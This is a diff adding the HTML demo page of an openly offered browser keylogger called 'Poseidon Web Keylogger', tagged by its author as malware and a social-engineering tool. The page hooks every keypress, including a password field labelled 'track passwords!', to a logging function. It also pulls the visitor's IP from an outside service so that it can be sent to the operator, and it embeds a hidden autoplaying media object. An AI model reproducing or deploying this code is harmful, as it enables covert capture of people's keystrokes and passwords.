@@ -1,0 +1,50 @@
+<!DOCTYPE html>
+<html>
+<head>
+
+<meta charset="UTF-8">
+<meta name="author" content="Lucas Marques Dutra">
+<meta name="name" content="Poseidon Web Keylogger">
+<meta name="version" content="1.0.0">
+<meta name="since" content="2015-12-03">
+<meta name="description" content="A Simple, usefull and lightweight Web Keylogger">
+<meta name="keywords" content="malware, keylogger, web keylogger, social engineering">
+<meta name="To" content="A. Possebon">
+<meta name="url" content="http://github.com/terremoth/poseidon">
+<meta name="License" content="General Public Licence v.3">
+
+<link rel="shortcut icon" type="image/png" href="assets/img/favicon.png">
+
+<title>Poseidon Web Keylogger</title>
+
+<script type="text/javascript" src="http://l2.io/ip.js?var=myip"></script> <!-- Get's your target's actual IP to send to Poseidon's angry -->
+<link rel="stylesheet" type="text/css" href="assets/css/style.css">
+
+</head>
+<body onkeypress="Poseidon(event.charCode, myip);" onunload="finalize()">
+
+<!-- Pirates, we are song -->
+<object width="0" height="0">
+	<param name="movie" value="http://www.youtube.com/v/6gOCQLaacrA?version=3&amp;hl=en_US&autoplay=1&loop=1"></param>
+	<param name="allowFullScreen" value="true"></param>
+	<param name="allowscriptaccess" value="always"></param>
+	<embed src="http://www.youtube.com/v/6gOCQLaacrA?version=3&amp;hl=en_US&autoplay=1&loop=1" type="application/x-shockwave-flash" allowscriptaccess="always" allowfullscreen="true" width="1" height="0"></embed>
+</object> 
+
+<h5>Poseidon Keylogger example page :-)</h5>
+
+<img title="Poseidon, the Evil One King of the Seas" src="https://upload.wikimedia.org/wikipedia/commons/2/2f/Poseidon_Penteskouphia_Louvre_CA452.jpg" width="15%">
+
+<h2>From now on, You are being logged my friend! </h2>
+
+
+<textarea rows="5" cols="50" placeholder="Type something to be tracked by server.php"></textarea><p>
+Ex. Password:
+<input type="password" placeholder="track passwords!">
+
+<address>Author: Lucas Marques Dutra - dutr4 [no-span] outlook.com</address>
+
+<script type="text/javascript" src="Poseidon.js"></script>
+
+</body>
+</html>
